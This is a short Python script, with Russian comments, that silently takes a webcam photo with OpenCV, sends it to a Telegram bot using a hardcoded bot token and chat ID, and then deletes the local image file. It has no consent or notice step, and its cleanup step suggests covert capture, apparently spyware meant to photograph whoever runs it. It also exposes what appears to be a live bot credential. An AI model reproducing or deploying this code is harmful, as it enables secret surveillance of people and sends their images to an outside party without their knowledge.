import cv2
import requests
import os

# === Настройки ===
bot_token = '7785202195:AAGBPO2by0Kg0uxZd70wF3aDeY-67U6905Q'
chat_id = '6154104101'
filename = 'photo.jpg'

# === Снимок с камеры ===
cap = cv2.VideoCapture(0)
ret, frame = cap.read()
cap.release()

if ret:
    cv2.imwrite(filename, frame)
else:
    exit()

# === Отправка в Telegram ===
url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
with open(filename, 'rb') as f:
    files = {'photo': f}
    data = {'chat_id': chat_id}
    requests.post(url, data=data, files=files)

# === Удаление файла ===
os.remove(filename)
